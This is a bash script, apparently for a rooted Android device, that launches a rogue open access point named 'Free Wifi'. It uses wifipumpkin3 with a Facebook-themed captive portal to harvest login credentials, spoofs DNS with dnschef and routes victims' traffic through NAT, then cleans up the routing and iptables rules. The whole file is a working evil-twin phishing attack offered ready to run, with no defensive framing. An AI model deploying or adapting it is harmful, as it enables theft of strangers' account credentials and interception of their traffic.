#!/bin/bash
APIFACE=wlan1
NETIFACE=wlan0
SSID="Free Wifi"
BSSID=00:11:22:33:44:55
CHANNEL=1
TEMPLATE=facebook
WLAN0TO1=1

# Trap Ctrl+C to run ALL cleanup
trap 'echo "[!] Interrupted! Cleaning up..."; \
      pkill -f dnschef; \
      pkill -f wifipumpkin3; \
      pkill -f hostapd; \
      pkill -f dnsmasq; \
      pkill python3; \
      if [[ ! $NETIFACE == "" ]]; then \
        ip rule del from all lookup main pref 1 2> /dev/null; \
        ip rule del from all iif lo oif $APIFACE uidrange 0-0 lookup 97 pref 11000 2> /dev/null; \
        ip rule del from all iif lo oif $NETIFACE lookup $table pref 17000 2> /dev/null; \
        ip rule del from all iif lo oif $APIFACE lookup 97 pref 17000 2> /dev/null; \
        ip rule del from all iif $APIFACE lookup $table pref 21000 2> /dev/null; \
      fi; \
      if [ -f /sdcard/iptables-default ]; then \
          echo "[*] Backup file found. Restoring iptables from /sdcard/iptables-default"; \
          iptables-restore < /sdcard/iptables-default; \
          echo "[+] iptables restored from backup"; \
      else \
          echo "[*] No backup file found. Removing only the added iptables rule"; \
          iptables -t nat -D POSTROUTING -o $NETIFACE -j MASQUERADE 2> /dev/null; \
          echo "[+] Added iptables rule removed"; \
      fi; \
      if [[ ! $AP_EXISTED == "1" &&  ! $APIFACE == "wlan0" ]]; then
        ip link set $APIFACE down; \
        iw dev $APIFACE del 2> /dev/null; \
        echo "$APIFACE removed" \
      fi; \
      echo "[*] Cleanup complete. Exiting."; \
      exit' INT

command -v wifipumpkin3 >/dev/null 2>&1 || { echo 'wifipumpkin3 is missing, installing..'; apt update && apt install wifipumpkin3 -y; }
command -v dnschef >/dev/null 2>&1 || { echo 'dnschef is missing, installing..'; apt update && apt install dnschef -y; }
echo "Checking if config folder exists.."
if [[ ! -d /root/.config/wifipumpkin3 ]]; then
  wifipumpkin3 -xpulp 'exit'
fi

echo "Checking for existing $APIFACE interface.."
if ip link show $APIFACE; then
  echo "$APIFACE exists, continuing.."
  AP_EXISTED="1"
else
  if [[ $WLAN0TO1 == 1 ]]; then
    if [[ $(iw list | grep '* AP') == *"* AP"* ]]; then
      echo "wlan0 supports AP mode, creating AP interface.."
      iw dev wlan0 interface add $APIFACE type __ap
      ip addr flush $APIFACE
      ip link set up dev $APIFACE
    else
      echo "wlan0 doesn't support AP mode, exiting.."
      exit 0
    fi
  fi
fi

if [[ ! $NETIFACE == "" ]]; then
  echo "Checking default rule number.."
  for table in $(ip rule list | awk -F"lookup" '{print $2}'); do
  DEF=$(ip route show table $table|grep default|grep $NETIFACE)
    if ! [ -z "$DEF" ]; then
       break
    fi
  done
  echo "Default rule number is $table"
  echo "Adding iptables rules for internet sharing.."
  iptables -t nat -A POSTROUTING -o $NETIFACE -j MASQUERADE
  ip rule add from all lookup main pref 1 2> /dev/null
  ip rule add from all iif lo oif $APIFACE uidrange 0-0 lookup 97 pref 11000 2> /dev/null
  ip rule add from all iif lo oif $NETIFACE lookup $table pref 17000 2> /dev/null
  ip rule add from all iif lo oif $APIFACE lookup 97 pref 17000 2> /dev/null
  ip rule add from all iif $APIFACE lookup $table pref 21000 2> /dev/null
fi
echo "Starting wifipumpkin3 and dnschef.."
if [[ ! $TEMPLATE == "" ]]; then
  TemplateCMD=" set captiveflask.$TEMPLATE true;"
  CaptiveCMD=" set proxy captiveflask true;"
  else CaptiveCMD=" set proxy noproxy;"
fi

sleep 20 && dnschef --interface 10.0.0.1 &
if [[ "$NETIFACE" == "" ]]; then IFACE_CMD=""; else IFACE_CMD="set interface_net $NETIFACE"; fi
wifipumpkin3 --xpulp "set interface $APIFACE; $IFACE_CMD; set ssid $SSID; set channel $CHANNEL; $CaptiveCMD $TemplateCMD start; ap"

# Cleanup after normal exit
echo "[*] Session ended. Running cleanup..."
pkill python3
if [[ ! $NETIFACE == "" ]]; then
  ip rule del from all lookup main pref 1 2> /dev/null
  ip rule del from all iif lo oif $APIFACE uidrange 0-0 lookup 97 pref 11000 2> /dev/null
  ip rule del from all iif lo oif $NETIFACE lookup $table pref 17000 2> /dev/null
  ip rule del from all iif lo oif $APIFACE lookup 97 pref 17000 2> /dev/null
  ip rule del from all iif $APIFACE lookup $table pref 21000 2> /dev/null
fi
if [ -f /sdcard/iptables-default ]; then
    echo "[*] Backup file found. Restoring iptables from /sdcard/iptables-default"
    iptables-restore < /sdcard/iptables-default
    echo "[+] iptables restored from backup"
else
    echo "[*] No backup file found. Removing only the added iptables rule"
    iptables -t nat -D POSTROUTING -o $NETIFACE -j MASQUERADE 2> /dev/null
    echo "[+] Added iptables rule removed"
fi
if [[ ! $AP_EXISTED == "1" && ! $APIFACE == "wlan0" ]]; then
  ip link set $APIFACE down
  iw dev $APIFACE del 2> /dev/null
  echo "$APIFACE removed"
fi
echo "[*] Cleanup complete."